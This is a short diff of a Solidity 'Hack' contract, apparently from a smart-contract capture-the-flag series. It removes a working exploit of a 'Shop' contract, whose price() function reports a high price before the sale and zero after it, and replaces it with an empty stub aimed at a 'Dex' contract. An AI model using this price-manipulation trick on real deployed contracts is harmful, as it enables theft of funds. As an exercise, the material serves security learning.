@@ -1,28 +1,12 @@
 // SPDX-License-Identifier: WTFPL
 pragma solidity 0.8.7;
 
-interface IShop {
-    function buy() external;
-
-    function isSold() external view returns (bool);
-}
+interface IDex {}
 
 contract Hack {
-    IShop shop;
+    IDex private immutable dex;
 
     constructor(address contractAddress) {
-        shop = IShop(contractAddress);
-    }
-
-    function attack() public {
-        shop.buy();
-    }
-
-    function price() public view returns (uint) {
-        if (shop.isSold()) {
-            return 0;
-        } else {
-            return 100;
-        }
+        dex = IDex(contractAddress);
     }
 }
